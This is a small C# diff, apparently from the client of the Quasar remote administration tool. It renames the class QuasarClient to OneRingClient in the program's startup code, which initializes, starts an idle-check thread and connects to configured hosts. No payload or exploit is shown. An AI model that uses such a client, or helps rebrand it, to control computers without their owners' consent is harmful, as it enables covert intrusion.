@@ -14,7 +14,7 @@ namespace xClient
 {
     internal static class Program
     {
-        public static QuasarClient ConnectClient;
+        public static OneRingClient ConnectClient;
         private static ApplicationContext _msgLoop;
 
         [STAThread]
@@ -28,7 +28,7 @@ namespace xClient
             {
                 if (Initialize())
                 {
-                    if (!QuasarClient.Exiting)
+                    if (!OneRingClient.Exiting)
                         ConnectClient.Connect();
                 }
             }
@@ -94,7 +94,7 @@ namespace xClient
 
             WindowsAccountHelper.StartUserIdleCheckThread();
 
-            ConnectClient = new QuasarClient(hosts);
+            ConnectClient = new OneRingClient(hosts);
             return true;
         }
     }
